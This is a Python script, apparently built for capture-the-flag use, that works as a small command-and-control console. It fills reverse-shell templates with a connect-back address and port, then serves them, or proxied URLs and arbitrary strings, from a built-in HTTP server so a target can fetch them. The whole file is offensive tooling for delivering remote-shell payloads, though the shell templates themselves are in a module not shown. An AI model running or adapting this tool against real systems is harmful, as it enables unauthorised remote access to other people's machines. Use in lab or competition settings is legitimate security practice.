import argparse
import multiprocessing
import urllib.request
import shells
import http.server
import socketserver
from presets import preset_urls


try:
    import netifaces as ni
    ifacesEnabled = True
except:
    print('Package netifaces not found, cannot use interface for IP retrieval')
global payload
payload ="No payload selected!"
banner = """
_________ ________                                         
\_   ___ \\_____  \                                        
/    \  \/  _(__  <    ______                              
\     \____/       \  /_____/                              
 \______  /______  /                                       
        \/       \/                                        
___________.__             _______________________________ 
\__    ___/|  |__   ____   \_   ___ \__    ___/\_   _____/ 
  |    |   |  |  \_/ __ \  /    \  \/ |    |    |    __)   
  |    |   |   Y  \  ___/  \     \____|    |    |     \    
  |____|   |___|  /\___  >  \______  /|____|    \___  /    
                \/     \/          \/               \/     
                                                .___       
  ____  ____   _____   _____ _____    ____    __| _/       
_/ ___\/  _ \ /     \ /     \\__  \  /    \  / __ |        
\  \__(  <_> )  Y Y  \  Y Y  \/ __ \|   |  \/ /_/ |        
 \___  >____/|__|_|  /__|_|  (____  /___|  /\____ |        
     \/            \/      \/     \/     \/      \/        
  ____                         __                .__       
 /  _ \     ____  ____   _____/  |________  ____ |  |      
 >  _ </\ _/ ___\/  _ \ /    \   __\_  __ \/  _ \|  |      
/  <_\ \/ \  \__(  <_> )   |  \  |  |  | \(  <_> )  |__    
\_____\ \  \___  >____/|___|  /__|  |__|   \____/|____/ 
                                                 
"""


class ShellHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        global payload
        try:
            self.wfile.write(payload.encode())
        except:
            self.wfile.write(payload)


def printShells(help=''):
    print('Available shells:')
    for shell in shells.shells:
        print(shell['name'])


def get_ip_address(ifname):
    return ni.ifaddresses(ifname)[ni.AF_INET][0]['addr']


def listener(port):
    print("Starting webserver on port " + port)
    with socketserver.TCPServer(("", int(port)), ShellHandler) as httpd:
        httpd.serve_forever()


def startServer():
    if not options['httpPort']:
        print("Error, http port not set")
    global process
    process = multiprocessing.Process(target=listener, args=(options['httpPort'],))
    process.start()
    process.join()


def printOptions():
    print("Options:\n")
    for key, value in options.items():
        print(key + ":" + str(value))
    print("\n")


def open_shellfile():
    print("Opening shellfile: "+options['shell'])
    if not options['localAddr'] or not options['localPort']:
        print("Error! Set localPort and localAddr")
    results = list(filter(lambda shell: shell['name'] == options['shell'], shells.shells))
    if len(results) > 0:
        selectedShell = results[0]
    else:
        print('ERROR: Unregognized shell type\n')
        printShells()

    shellFile = open('shells/' + selectedShell['file'], 'r')
    data = shellFile.read()
    data = data.replace('[LIP]', options['localAddr']).replace('[LP]', str(options['localPort']))
    return data


def setValue(key, value):
    if options.__contains__(key):
        options[key] = value
        printOptions()


def open_url(url):
    if url in preset_urls:
        url = preset_urls[url]

    if "://" not in url:
        url = 'https://'+url
    print("Proxying url: "+url)
    with urllib.request.urlopen(url) as f:
        html = f.read()
        return html


running = True

parser = argparse.ArgumentParser(
    description='A script to generate reverse shells on various languages and serve them on http-server.')
parser.add_argument('-l', dest='shell',
                    help='Language to identify the shell to be built. Use -s to see available shells.')
parser.add_argument('-a', dest='localAddr', type=str, help='Address to connect back to')
parser.add_argument('-p', dest='localPort', help='Port to connect back to', default=4444)
parser.add_argument('-o', dest='outfile', help='File to write the reverse shell to')
parser.add_argument('-s', dest='printShells', action='store_true', help='Print available shells')
parser.add_argument('-i', dest="interface", help="Interface name to get ip for reverse shell script")
parser.add_argument('--httpserver', dest='httpServer', action='store_true', default=False,
                    help='Server the reverse-shell file on a http server')
parser.add_argument('--httpPort', dest='httpPort', help='Port to start HTTP server in, default 80', default=80)


args = parser.parse_args()
options = vars(args)
print(banner)
printOptions()

if args.printShells:
    printShells()
    exit()

process = multiprocessing.Process(target=listener, args=(options['httpPort'],))


while running:
    cmd = input('C3>')
    words = cmd.split(" ")

    if words[0] == 'stop':
        process.kill()
    elif words[0].startswith("set"):
        setValue(words[1], words[2])
    elif words[0] == 'reverse':
        payload = open_shellfile()
        if words[1] == 'serve':
            process.start()
        elif words[1] == 'print':
            print(payload)
    elif words[0] == 'proxy':
        payload = open_url(words[1])
        if process.is_alive():
            process.kill()
        process.start()
    elif words[0] == 'exec':
        payload = words[1]
    elif words[0] == 'exit':
        running = False
